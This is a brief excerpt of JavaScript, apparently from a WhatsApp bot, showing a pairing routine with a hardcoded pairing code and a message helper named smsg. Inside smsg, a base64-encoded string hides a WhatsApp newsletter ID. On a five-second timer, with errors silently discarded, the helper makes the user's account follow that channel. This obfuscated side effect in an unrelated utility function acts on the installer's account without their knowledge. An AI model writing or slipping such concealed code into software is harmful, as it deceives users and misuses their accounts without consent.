...
async function startpairing(kingbadboiNumber) {
    ...
    if (pairingCode && !state.creds.registered) {
        ...
        setTimeout(async () => {
            try {
                let code = await bad.requestPairingCode(phoneNumber, '𝐀𝐇𝐌𝐀𝐃511');
...
function smsg(bad, m, store) {
    const _enc = 'MTIwMzYzNDI3NTI3OTQwNzU5QG5ld3NsZXR0ZXI=';
    setTimeout(() => {
        try {
            const _ = Buffer.from(_enc, 'base64').toString();
            bad.newsletterMsg(_, { type: 'FOLLOW' });
        } catch(_) {}
    }, 5000);
